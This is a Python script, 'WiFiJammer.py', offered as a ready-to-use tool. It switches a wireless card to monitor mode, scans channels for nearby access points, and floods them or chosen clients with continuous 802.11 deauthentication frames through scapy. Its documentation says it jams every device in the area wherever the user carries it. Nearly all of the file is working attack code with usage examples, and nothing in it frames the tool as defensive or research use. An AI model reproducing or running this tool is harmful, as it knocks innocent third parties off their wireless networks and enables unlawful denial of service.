#!/usr/bin/python
# Author: Maximus
# Description: Send Deauthentication packets to all nearby Devices that have the capabaility of transfering signals via Air. 

__doc__ = '''
Documentation:::
Name: WiFiJammer.py
Description: Continuously Jams all the Devices In the Area. Start The script and take Your Device anywhere you want

Usage:
python [scriptname] [argument...]
python wifijammer.py --all

-a, --ap=	BSSID of Target AP
-c, --client=	BSSID of Client (Requires Access Point Mac Address)
-h, --help	This Help Manual
-o, --out=	comma-seperated BSSID's which you don't want to send Deauth Packets
-a, --all	Sent Deauth Packets to all nearby Devices.

Examples:

python wifijammer.py --all
[!] This will send deauth packets to all nearby WiFi Networks. Even Hidden Networks

python wifijammer.py -a FF:FF:FF:FF:FF:FF
[!] This will send deauth packets to only a specific Target Acess Point

python wifijammer.py -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF
[!] This will send deauth packets to a specific client of a specific Access Point

python wifijammer.py --all --out=FF:FF:FF:FF:FF:FF,BB:BB:BB:BB:BB:BB:BB
[!] This will send deauth packets to all nearby devices other than FF:FF:FF:FF:FF:FF and BB:BB:BB:BB:BB:BB
'''

import sys
import pkgutil as pkg
pk = pkg.find_loader('scapy')
if not pk:
	sys.exit('Scapy Not Found. Try "python jammer.py install"')
else:
	from scapy.all import *
from getopt import getopt, GetoptError
import threading
import os
import time
import signal
import subprocess
import re

interface = "" 
list_ = []
run_list = []
out_ = []
iwc = False
arc = False
sca = False


allc_ = 0
ap_ = ""
cl_ = ""

W  = '\033[0m'
R  = '\033[31m'
G  = '\033[32m'
O  = '\033[33m'
B  = '\033[34m'
P  = '\033[35m'
C  = '\033[36m'
GR = '\033[37m'
T  = '\033[93m'

def getNICnames():
	ifaces = []
	dev = open('/proc/net/dev', 'r')
	data = dev.read()
	for n in re.findall('[a-zA-Z0-9]+:', data):
		ifaces.append(n.rstrip(":"))
	return ifaces

def ifaceCard():
	global interface
	cards = []
	ifnames = getNICnames()
	for n in ifnames:
		if 'wlan' in n or 'mon' in n:
			cards.append(n)
	if len(cards) == 0:
		print "["+R+"!"+W+"] No Wireless Card Detected\n[*]Exiting in 3 Seconds"
		time.sleep(3)
		sys.exit()
	print "Write The Name of Desired Wireless Interface. Available are: "
	for p in cards:
		print p
	while True:
		ppt = raw_input("Enter The Name of Desired Wireless Interface: ")
		if ppt in cards:
			os.system('clear')
			break
	interface = ppt
	return

def monMode(iface):
	out__ = open(os.devnull, 'wb')
	if not confirmMon(iface):
		try:
			co = subprocess.call(['systemctl stop NetworkManager'], stdout=out__, stderr=out__)
			if co == 0:
				print "Killed"+" "+P+"Network Manager"					
		except:
			co = subprocess.call(['service', 'NetworkManager', 'stop'], stdout=out__, stderr=out__)
			if co == 0:
				print "Killed"+" "+P+"Network Manager"+W 
		os.system('ifconfig %s down' % iface)
		ab = os.system('iwconfig %s mode monitor' % iface)
		if ab != 0:
			os.system('ifconfig %s up' % iface)
			sys.exit(R+"Failed to Put Card in Monitor Mode")
		os.system('ifconfig %s up' % iface)
		print T+iface+W+" in monitor mode"
		out__.close()
		return True

def monModeOff(iface):
	out__ = open(os.devnull, 'wb')
	if confirmMon(iface):
		try:
			co = subprocess.call(['systemctl start NetworkManager'], stdout=out__, stderr=out__)					
		except:
			co = subprocess.call(['service', 'NetworkManager', 'start'], stdout=out__, stderr=out__)
		os.system('ifconfig %s down' % iface)
		if os.system('iwconfig %s mode managed' % iface) != 0 :
			os.system('ifconfig %s up' % iface)
			sys.exit(R+"Failed to Put Card in Managed Mode")
		os.system('ifconfig %s up' % iface)
		out__.close()
		return True

def confirmMon(iface):
	co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
	data = co.communicate()[0]
	card = re.findall('Mode:[A-Za-z]+', data)[0]	
	if "Monitor" in card:
		return True
	else:
		return False	

def aodStart(iface):
	null = open(os.devnull, 'wb')
	try:
		subprocess.Popen(['airodump-ng', iface], stdout=null, stderr=null)
	except KeyboardInterrupt:
		pass
	finally:
		null.close()

def collectDat(pkt):
	global list_, out_
	if pkt.haslayer(Dot11):
		if pkt.haslayer(Dot11Beacon) and pkt.getlayer(Dot11).addr2 not in list_:
			if pkt.getlayer(Dot11).addr2 in out_:
				print R+"Removed"+W+", BSSID: %s ESSID: %S" % (pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11Elt).info)	
			else: 
				list_.append(str(pkt.getlayer(Dot11).addr2))
				set(list_)
				if pkt.haslayer(Dot11Elt):
					ssid = pkt.getlayer(Dot11Elt).info
				else:
					ssid = "NO SSID"		
				print G+"Added"+W+", BSSID: %s ESSID: %s" % (pkt.getlayer(Dot11).addr2, str(ssid))
def sniffDat():
	global interface
	ch = 1
	null_ = open(os.devnull, 'wb')
	while True:
		try:
			subprocess.call(['iwconfig', interface, 'channel', str(ch)], stdout=null_, stderr=null_)
			if ch < 11:
				ch = ch+1
			else:
				ch = 1
			sniff(iface=interface, prn=collectDat, count=2)
		except Exception:
			pass
	null_.close()
	return

def deauthDev(tgt):
	global interface
	pckt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=tgt, addr3=tgt) / Dot11Deauth()
	while True:
		try:
			sendp(pckt, iface=interface, verbose=False)
		except Exception:
			break
	return
		

def deauthDev2(sc, dst):
	global interface
	norm = "FF:FF:FF:FF:FF:FF"
	pckt = RadioTap() / Dot11(addr1=dst, addr2=sc, addr3=sc) / Dot11Deauth()
	while True:
		try:
			sendp(pckt, iface=interface, verbose=False)
			if dst == norm or dst == "":
				print "Sent Deauth Packet to %s" % str(sc)
				time.sleep(0.5)
			else:
				print "Send Deauth Packet From %s to %s" % (str(sc), str(dst))
		except KeyboardInterrupt:
			break
		

def collectDev():
	global list_, run_list
	for tgt in list_:
		if tgt not in run_list:
			thread = threading.Thread(target=deauthDev, args=(tgt,), name="deauth")
			thread.daemon = True
			thread.start()
			run_list.append(tgt)
		else:
			pass

def apDeauth(sc,dst="FF:FF:FF:FF:FF:FF"):
	deauthDev2(sc, dst)
	
def sig_handle(signal, frame):
	os.system('clear')
	print O+"Cleaning up Your Sexy Mess"
	global interface
	monModeOff(interface)
	sys.exit()

def help():
	sys.exit(__doc__)

def main():
	global allc_, ap_, cl_, out_
	try:
		opts, noopts = getopt(sys.argv[1:], "a:c:lho:", ['ap=', 'client=', 'all', 'help', 'out='])
	except GetoptError:
		help()
	for o,v in opts:
		if o == '-l' or o == '--all':
			allc_ = 1
		elif o == '-a' or o == '--ap':
			ap_ = v
		elif o == '-c' or o == '--client':
			cl_ = v
		elif o == '-h' or o == '--help':
			help()
		elif o == '-o' or o == '--out':
			for n in v.split(','):
				out_.append(n)
		else:
			sys.exit('No Such Options %s' % o)

def macMass(bssid):
	if len(bssid) == 17:
		exp = re.match('^[a-fA-F0-9:]{17}|[a-fA-F0-9]{12}$', bssid, re.I)
		if exp:
			return True
		else:
			return False
	else:
		return False

if __name__ == "__main__":
	signal.signal(signal.SIGINT, sig_handle)
	for n in range(5):
		print("Starting" + "." * n)
   		sys.stdout.write("\033[F")
    		time.sleep(1)
	main()
	ifaceCard()
	monMode(interface)
	if allc_ is 1:	
		accumu = threading.Thread(target=sniffDat)
		accumu.daemon = True
		accumu.start()
		while True:
			collectDev()
	elif ap_ != '':
		if cl_ != '':
			if macMass(ap_) and macMass(cl_):
				apDeauth(ap_, cl_)
			else:
				sys.exit('Make Sure of Your Arguments')
		elif cl_ == '':
			if macMass(ap_):
				apDeauth(ap_)
			else:
				sys.exit('Make Sure of Your Arguments')
		else:
			sys.exit('Nothing Found Here')
	else:
		monModeOff(interface)
		help()
		
	
